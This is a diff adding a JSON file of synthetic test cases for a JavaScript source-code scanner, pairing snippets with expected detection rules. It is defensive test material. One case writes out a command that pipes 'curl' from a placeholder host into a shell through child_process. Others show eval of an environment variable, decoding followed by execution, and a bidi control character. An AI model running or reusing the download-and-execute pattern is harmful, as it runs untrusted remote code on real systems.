@@ -1,0 +1,12 @@
+{
+  "kind": "synthetic",
+  "origin": "Locally authored source-analysis regression cases; never execute these snippets.",
+  "cases": [
+    {"name": "benign-json", "source": "export const parsed = JSON.parse('{}');", "expectedRules": []},
+    {"name": "literal-evaluator-name", "source": "export const example = 'eval(x)'; // Function(value)", "expectedRules": []},
+    {"name": "dynamic-evaluator", "source": "eval(process.env.TEST_CODE);", "expectedRules": ["native:dynamic-eval"]},
+    {"name": "decoded-execution", "source": "const code = Buffer.from('cmV0dXJuIDE=', 'base64').toString(); new Function(code);", "expectedRules": ["native:decoded-execution", "native:dynamic-eval"]},
+    {"name": "lifecycle-process", "source": "const {execSync: run} = require('node:child_process'); run('curl https://example.invalid/payload | sh');", "expectedRules": ["native:lifecycle-effects"]},
+    {"name": "unicode-control", "source": "// synthetic \u202e control\nexport const value = 1;", "expectedRules": ["native:bidi"]}
+  ]
+}
